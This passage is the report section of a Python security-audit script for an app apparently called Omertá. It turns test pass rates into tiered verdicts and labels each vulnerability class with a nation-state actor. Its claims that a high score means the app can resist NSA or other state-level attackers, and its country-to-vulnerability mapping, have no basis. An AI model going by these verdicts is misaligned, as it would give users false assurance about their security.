                        print(f"      Payload: {str(vuln['payload'])[:100]}...")
        
        # State-level actor assessment
        print(f"\n🎯 STATE-LEVEL ACTOR RESISTANCE ASSESSMENT:")
        
        if success_rate >= 95 and len(self.critical_failures) == 0:
            print("🛡️ FORTRESS-LEVEL SECURITY: Can resist NSA/Five Eyes attacks")
            print("   ✅ All major attack vectors blocked")
            print("   ✅ Cryptographic implementation secure")
            print("   ✅ No critical vulnerabilities found")
            
        elif success_rate >= 85 and len(self.critical_failures) <= 2:
            print("⚠️ STRONG SECURITY: Can resist most nation-state attacks")
            print("   ✅ Most attack vectors blocked")
            print("   ⚠️ Minor vulnerabilities present")
            print("   🔧 Requires security hardening")
            
        elif success_rate >= 70:
            print("🔶 MODERATE SECURITY: Vulnerable to advanced persistent threats")
            print("   ⚠️ Multiple attack vectors available")
            print("   🚨 Critical vulnerabilities present")
            print("   🔧 Major security improvements needed")
            
        else:
            print("🚨 WEAK SECURITY: Easily compromised by state-level actors")
            print("   ❌ Multiple critical vulnerabilities")
            print("   ❌ Basic attack vectors successful")
            print("   🚨 IMMEDIATE SECURITY OVERHAUL REQUIRED")
        
        # Specific threat actor analysis
        print(f"\n🌍 THREAT ACTOR SPECIFIC ANALYSIS:")
        
        # NSA/Five Eyes capability
        nsa_success = len([v for v in self.security_vulnerabilities if v['type'] in ['SQL_INJECTION_BYPASS', 'AUTHENTICATION_BYPASS', 'COMMAND_INJECTION']]) == 0
        print(f"🇺🇸 NSA/Five Eyes: {'🛡️ BLOCKED' if nsa_success else '🚨 CAN PENETRATE'}")
        
        # Russian APT capability
        russian_success = len([v for v in self.security_vulnerabilities if v['type'] in ['XSS_BYPASS', 'CSRF_VULNERABILITY', 'DIRECTORY_TRAVERSAL']]) == 0
        print(f"🇷🇺 Russian APT: {'🛡️ BLOCKED' if russian_success else '🚨 CAN PENETRATE'}")
        
        # North Korean capability
        nk_success = len([v for v in self.security_vulnerabilities if v['type'] in ['MALICIOUS_FILE_UPLOAD', 'MALICIOUS_VOICE_UPLOAD']]) == 0
        print(f"🇰🇵 North Korean: {'🛡️ BLOCKED' if nk_success else '🚨 CAN PENETRATE'}")
        
        # Chinese capability
        chinese_success = len(self.critical_failures) == 0 and success_rate >= 90
        print(f"🇨🇳 Chinese MSS: {'🛡️ BLOCKED' if chinese_success else '🚨 CAN PENETRATE'}")
        
        # Final verdict
        print(f"\n🏆 FINAL VERDICT:")
        if success_rate >= 95 and len(self.critical_failures) == 0 and len(self.security_vulnerabilities) == 0:
            print("🎉 OMERTÁ IS FORTRESS-LEVEL SECURE - READY FOR DEPLOYMENT AGAINST STATE-LEVEL THREATS")
        elif success_rate >= 80:
            print("⚠️ OMERTÁ HAS STRONG SECURITY BUT NEEDS HARDENING BEFORE FACING STATE-LEVEL THREATS")
        else:
            print("🚨 OMERTÁ IS NOT READY FOR STATE-LEVEL THREATS - MAJOR SECURITY OVERHAUL REQUIRED")
        
        # Save detailed results
        audit_results = {
            'summary': {
                'total_tests': self.total_tests,
                'passed_tests': self.passed_tests,
                'failed_tests': self.failed_tests,
                'success_rate': success_rate,
                'critical_failures': len(self.critical_failures),
                'security_vulnerabilities': len(self.security_vulnerabilities),
                'timestamp': datetime.now().isoformat()
            },
            'critical_failures': self.critical_failures,
            'security_vulnerabilities': self.security_vulnerabilities,
            'detailed_results': self.results
        }
        
        with open('/app/brutal_security_audit_results.json', 'w') as f:
            json.dump(audit_results, f, indent=2)
        
        print(f"\n📊 Detailed audit results saved to: /app/brutal_security_audit_results.json")
        
        return success_rate

if __name__ == "__main__":
    auditor = BrutalSecurityAuditor()
    success_rate = auditor.run_comprehensive_security_audit()
    
    # Exit with appropriate code
    sys.exit(0 if success_rate >= 80 else 1)